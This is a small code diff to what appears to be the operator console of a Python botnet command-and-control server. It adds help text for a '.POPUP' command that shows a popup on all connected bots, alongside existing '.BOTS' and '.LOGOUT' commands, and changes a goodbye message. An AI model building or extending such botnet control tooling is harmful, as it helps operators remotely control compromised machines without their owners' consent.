@@ -119,6 +119,7 @@ def command_line(client):
                 send(client, '.CLEAR: Clears the screen')
                 send(client, '.LOGOUT: Disconnects from server')
                 send(client, '.BOTS: Displays info of connected bots.')
+                send(client, '.POPUP: Displays a popup to all bots, instead of a space, do an asterisk aka the * symbol')
                 send(client, '')
 
             elif command.upper() == '.CLEAR':
@@ -127,7 +128,7 @@ def command_line(client):
                     send(client, x)
 
             elif command.upper() == '.LOGOUT':
-                send(client, 'Goodbye :-)')
+                send(client, 'Cya')
                 time.sleep(1)
                 break
 
@@ -139,8 +140,7 @@ def command_line(client):
                 else:
                     send(client, "This command takes no args.")
 
-
-
+            
 
         except:
             break
